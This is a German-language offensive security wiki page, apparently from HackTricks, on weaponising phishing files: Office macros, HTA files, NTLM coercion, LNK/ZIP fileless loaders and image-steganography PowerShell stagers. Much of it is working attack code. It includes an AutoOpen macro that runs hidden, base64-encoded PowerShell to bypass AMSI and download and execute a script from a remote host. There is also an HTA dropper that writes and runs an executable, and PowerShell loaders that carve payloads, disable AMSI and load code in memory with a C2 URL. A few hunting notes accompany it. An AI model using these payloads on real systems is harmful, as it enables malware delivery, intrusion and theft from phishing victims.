# Phishing Dateien & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt eine Datenvalidierung von Dateien durch, bevor eine Datei geöffnet wird. Die Datenvalidierung erfolgt in Form der Identifizierung von Datenstrukturen gemäß dem OfficeOpenXML-Standard. Wenn während der Identifizierung der Datenstrukturen ein Fehler auftritt, wird die zu analysierende Datei nicht geöffnet.

In der Regel verwenden Word-Dateien mit Makros die Erweiterung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem die Dateiendung geändert wird, und dennoch die Ausführungsfähigkeit der Makros beizubehalten.\
Beispielsweise unterstützt eine RTF-Datei per Design keine Makros, aber eine in RTF umbenannte DOCM-Datei wird von Microsoft Word behandelt und kann Makros ausführen.\
Die gleichen Interna und Mechanismen gelten für alle Programme der Microsoft Office Suite (Excel, PowerPoint etc.).

Sie können den folgenden Befehl verwenden, um zu prüfen, welche Erweiterungen von bestimmten Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files, die auf eine entfernte Vorlage verweisen (File –Options –Add-ins –Manage: Templates –Go), die macros enthält, können macros ebenfalls „ausführen“.

### Externes Laden von Bildern

Gehe zu: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Es ist möglich, macros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload-Funktionen

Je häufiger sie sind, desto wahrscheinlicher wird AV sie erkennen.

- AutoOpen()
- Document_Open()

#### Macros Code-Beispiele
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadaten manuell entfernen

Gehe zu **Datei > Informationen > Dokument prüfen > Dokument prüfen**, wodurch der Document Inspector geöffnet wird. Klicke **Prüfen** und dann **Alle entfernen** neben **Dokumenteigenschaften und persönliche Informationen**.

#### Dateiendung

Wähle im Anschluss das Dropdown **Save as type**, ändere das Format von **`.docx`** zu **Word 97-2003 `.doc`**.\
Mach das, weil du **Makros nicht in einer `.docx`** speichern kannst und es ein **Stigma** gegenüber der makro-aktivierten **`.docm`**-Erweiterung gibt (z. B. hat das Vorschausymbol ein großes `!` und einige Web-/E-Mail-Gateways blockieren sie komplett). Daher ist diese **Legacy-`.doc`-Erweiterung der beste Kompromiss**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

Ein HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript) kombiniert**. Es erzeugt die Benutzeroberfläche und läuft als eine "fully trusted" Anwendung, ohne die Einschränkungen des Sicherheitsmodells eines Browsers.

Ein HTA wird mit **`mshta.exe`** ausgeführt, das in der Regel zusammen mit **Internet Explorer** installiert ist, wodurch **`mshta` von IE abhängig** ist. Wurde dieser deinstalliert, können HTAs nicht ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM-Authentifizierung erzwingen

Es gibt mehrere Möglichkeiten, **NTLM authentication "remote"** zu erzwingen — zum Beispiel kannst du **unsichtbare Bilder** in E-Mails oder HTML einfügen, auf die der Benutzer zugreift (auch HTTP MitM?). Oder sende dem Opfer die **Adresse von Dateien**, die schon beim **Öffnen des Ordners** eine **Authentifizierung** auslösen.

**Prüfe diese Ideen und mehr auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen kannst, sondern auch **NTLM relay attacks** durchführen kannst:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Hocheffektive Kampagnen liefern ein ZIP, das zwei legitime Köderdokumente (PDF/DOCX) und eine bösartige .lnk enthält. Der Trick ist, dass der eigentliche PowerShell loader in den Rohbytes des ZIPs nach einem eindeutigen Marker gespeichert ist, und die .lnk ihn herausschneidet und vollständig im Speicher ausführt.

Typischer Ablauf, implementiert vom .lnk PowerShell one-liner:

1) Finde das originale ZIP in üblichen Pfaden: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und im Parent des aktuellen Arbeitsverzeichnisses.  
2) Lese die ZIP-Bytes und finde einen hardcodierten Marker (z. B. xFIQCV). Alles nach dem Marker ist die embedded PowerShell payload.  
3) Kopiere das ZIP nach %ProgramData%, entpacke es dort und öffne die decoy .docx, um legitim zu wirken.  
4) Umgehe AMSI für den aktuellen Prozess: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Deobfuscate der nächsten Stage (z. B. alle # Zeichen entfernen) und führe sie im Speicher aus.

Beispiel PowerShell-Skelett, um die embedded Stage herauszuschneiden und auszuführen:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Hinweise
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-Dateien, die den ASCII-Markierungsstring (z. B. xFIQCV) am Ende der Archivdaten enthalten.
- .lnk, das übergeordnete/Benutzerordner auflistet, um das ZIP zu finden, und ein Decoy-Dokument öffnet.
- AMSI-Manipulation via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads, die mit Links enden, die unter vertrauenswürdigen PaaS-Domains gehostet sind.

## Steganography-delimited payloads in images (PowerShell stager)

Neuere Loader-Ketten liefern ein obfuskiertes JavaScript/VBS, das einen Base64 PowerShell stager dekodiert und ausführt. Dieser Stager lädt ein Bild herunter (oft GIF), das eine Base64-kodierte .NET DLL enthält, verborgen als Klartext zwischen eindeutigen Start-/End-Markern. Das Script sucht nach diesen Delimitern (in freier Wildbahn beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den Zwischen-Text, dekodiert das Base64 zu Bytes, lädt die Assembly im Speicher und ruft eine bekannte Entry-Methode mit der C2-URL auf.

Ablauf
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell Stego-Payload-Extraktor und Loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Hinweise
- Dies ist ATT&CK T1027.003 (steganography/marker-hiding). Marker variieren zwischen Kampagnen.
- AMSI/ETW bypass und string deobfuscation werden üblicherweise angewendet, bevor die assembly geladen wird.
- Erkennung: Scanne heruntergeladene Images nach bekannten Delimitern; identifiziere PowerShell, das auf Images zugreift und unmittelbar Base64-Blobs dekodiert.

Siehe auch Stego-Tools und Carving-Techniken:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Eine wiederkehrende Initialstufe ist eine kleine, stark obfuskierte `.js` oder `.vbs`, die in einem Archiv geliefert wird. Ihr einziger Zweck ist es, einen eingebetteten Base64-String zu dekodieren und PowerShell mit `-nop -w hidden -ep bypass` zu starten, um die nächste Stufe über HTTPS einzuleiten.

Skeleton logic (abstract):
- Eigene Datei einlesen
- Ein Base64-Blob zwischen Junk-Strings lokalisieren
- In ASCII PowerShell dekodieren
- Mit `wscript.exe`/`cscript.exe` ausführen, die `powershell.exe` aufrufen

Hunting cues
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Befehlszeile starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus Benutzer-Temppfaden startet.

## Windows files to steal NTLM hashes

Check the page about **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
